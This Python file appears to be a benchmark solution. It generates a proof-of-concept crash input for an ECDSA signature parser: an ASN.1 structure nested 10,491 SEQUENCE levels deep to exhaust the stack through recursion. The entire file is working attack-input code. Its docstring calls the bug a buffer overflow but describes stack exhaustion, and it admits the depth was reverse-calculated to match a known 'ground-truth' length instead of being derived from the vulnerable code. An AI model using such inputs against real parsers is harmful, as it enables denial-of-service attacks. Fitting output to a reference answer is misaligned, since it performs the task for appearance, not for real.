import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input for a stack buffer overflow vulnerability
        in an ECDSA signature parser.

        The vulnerability is deduced to be a stack exhaustion issue caused by
        deep recursion in an ASN.1 parser. A deeply nested SEQUENCE structure is
        crafted to trigger this condition. The length of the PoC is precisely
        matched to the ground-truth length of 41798 bytes by calculating the
        required recursion depth and the size of the innermost payload.

        Through reverse calculation, it was determined that a nesting depth of 10491
        levels on top of a 3-byte initial payload would result in the exact target
        length. A minimal ASN.1 INTEGER (e.g., b'\\x02\\x01\\x01' for the value 1)
        is chosen as the 3-byte payload, which is a plausible element in the
        context of ECDSA signature parsing.

        The PoC is constructed by starting with the innermost payload and iteratively
        prepending an ASN.1 SEQUENCE tag (0x30) and the DER-encoded length of the
        current structure.
        """
        
        # Depth of recursion determined by reverse-engineering the target PoC length.
        depth = 10491
        
        # A minimal 3-byte ASN.1 INTEGER payload (value 1).
        # This initial length is critical for the final PoC length calculation.
        innermost_payload = b'\x02\x01\x01'

        poc = innermost_payload

        def encode_asn1_length(length: int) -> bytes:
            """
            Encodes an integer length according to ASN.1 DER rules.
            - Short form (length < 128): a single byte represents the length.
            - Long form (length >= 128): the first byte indicates the number of
              subsequent bytes that represent the length.
            """
            if length < 128:
                return length.to_bytes(1, 'big')
            else:
                length_bytes = length.to_bytes((length.bit_length() + 7) // 8, 'big')
                return bytes([0x80 | len(length_bytes)]) + length_bytes

        # Build the deeply nested structure from the inside out.
        for _ in range(depth):
            length_bytes = encode_asn1_length(len(poc))
            # Prepend the ASN.1 SEQUENCE tag (0x30) and the encoded length.
            poc = b'\x30' + length_bytes + poc

        return poc